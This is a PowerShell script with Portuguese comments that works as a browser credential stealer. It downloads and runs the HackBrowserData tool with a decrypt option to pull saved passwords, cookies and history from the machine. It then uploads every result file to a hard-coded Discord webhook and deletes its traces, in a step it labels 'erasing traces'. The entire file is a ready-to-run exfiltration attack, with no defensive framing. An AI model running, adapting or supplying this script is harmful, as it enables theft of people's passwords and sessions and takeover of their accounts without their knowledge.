# ============================================================
# Script: BrowserDataExtractor.ps1
# Descrição: Baixa, executa e envia dados do HackBrowserData
# ============================================================

# Configurações
$WebhookURL = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
$DownloadURL = "https://github.com/moonD4rk/HackBrowserData/releases/download/v1.1.0/hack-browser-data-windows-64bit.zip"
$TempPath = $env:TEMP
$ZipFile = Join-Path $TempPath "hack-browser-data.zip"
$ExtractFolder = Join-Path $TempPath "HackBrowserData"
$ResultsFolder = Join-Path $ExtractFolder "results"

# Função para enviar arquivo para o Discord (CORRIGIDA)
function Send-FileToDiscord {
    param([string]$FilePath)
    try {
        $Boundary = "---------------------------$([System.Guid]::NewGuid().ToString('N'))"
        $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $FileName = [System.IO.Path]::GetFileName($FilePath)
        
        $BodyLines = (
            "--$Boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"",
            "Content-Type: application/octet-stream",
            "",
            [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($FileBytes),
            "--$Boundary--",
            ""
        ) -join "`r`n"
        
        $Headers = @{
            "Content-Type" = "multipart/form-data; boundary=$Boundary"
        }
        
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Headers $Headers -Body $BodyLines -ErrorAction Stop
        Write-Host "[+] Enviado: $FileName" -ForegroundColor Green
    } catch {
        # CORREÇÃO: usar ${} para delimitar a variável ou escapar os dois pontos
        Write-Host ("[!] Falha ao enviar {0}: {1}" -f $FileName, $_.Exception.Message) -ForegroundColor Red
    }
}

# ===== ETAPA 1: Baixar =====
Write-Host "[*] Baixando HackBrowserData..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $DownloadURL -OutFile $ZipFile -ErrorAction Stop
    Write-Host "[+] Download concluído." -ForegroundColor Green
} catch {
    Write-Host "[!] Erro no download: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# ===== ETAPA 2: Extrair =====
Write-Host "[*] Extraindo arquivos..." -ForegroundColor Cyan
try {
    if (Test-Path $ExtractFolder) { Remove-Item -Recurse -Force $ExtractFolder }
    Expand-Archive -Path $ZipFile -DestinationPath $ExtractFolder -ErrorAction Stop
    Write-Host "[+] Extração concluída." -ForegroundColor Green
} catch {
    Write-Host "[!] Erro ao extrair: $($_.Exception.Message)" -ForegroundColor Red
    Remove-Item -Force $ZipFile -ErrorAction SilentlyContinue
    exit 1
}
Remove-Item -Force $ZipFile -ErrorAction SilentlyContinue

# ===== ETAPA 3: Executar =====
Write-Host "[*] Executando HackBrowserData..." -ForegroundColor Cyan
$ExePath = Get-ChildItem -Path $ExtractFolder -Filter "*.exe" -Recurse | Select-Object -First 1
if (-not $ExePath) {
    Write-Host "[!] Executável não encontrado!" -ForegroundColor Red
    Remove-Item -Recurse -Force $ExtractFolder -ErrorAction SilentlyContinue
    exit 1
}

try {
    $Process = Start-Process -FilePath $ExePath.FullName -WorkingDirectory $ExtractFolder -Wait -PassThru -NoNewWindow -ArgumentList "--decrypt"
    Write-Host "[+] Execução finalizada (código: $($Process.ExitCode))." -ForegroundColor Green
} catch {
    Write-Host "[!] Erro ao executar: $($_.Exception.Message)" -ForegroundColor Red
    Remove-Item -Recurse -Force $ExtractFolder -ErrorAction SilentlyContinue
    exit 1
}

# ===== ETAPA 4: Enviar resultados =====
if (-not (Test-Path $ResultsFolder)) {
    Write-Host "[!] Pasta 'results' não encontrada!" -ForegroundColor Red
    Remove-Item -Recurse -Force $ExtractFolder -ErrorAction SilentlyContinue
    exit 1
}

Write-Host "[*] Enviando arquivos para o Discord..." -ForegroundColor Cyan
$Files = Get-ChildItem -Path $ResultsFolder -File
if ($Files.Count -eq 0) {
    Write-Host "[!] Nenhum arquivo encontrado em 'results'." -ForegroundColor Yellow
} else {
    foreach ($File in $Files) {
        Send-FileToDiscord -FilePath $File.FullName
        Start-Sleep -Milliseconds 500
    }
    Write-Host "[+] Todos os arquivos enviados." -ForegroundColor Green
}

# ===== ETAPA 5: Limpeza total =====
Write-Host "[*] Apagando rastros..." -ForegroundColor Cyan
try {
    if (Test-Path $ExtractFolder) {
        Remove-Item -Recurse -Force $ExtractFolder -ErrorAction Stop
    }
    if (Test-Path $ZipFile) {
        Remove-Item -Force $ZipFile -ErrorAction Stop
    }
    Write-Host "[+] Todos os rastros removidos." -ForegroundColor Green
} catch {
    Write-Host "[!] Erro na limpeza: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host " Script finalizado." -ForegroundColor Magenta
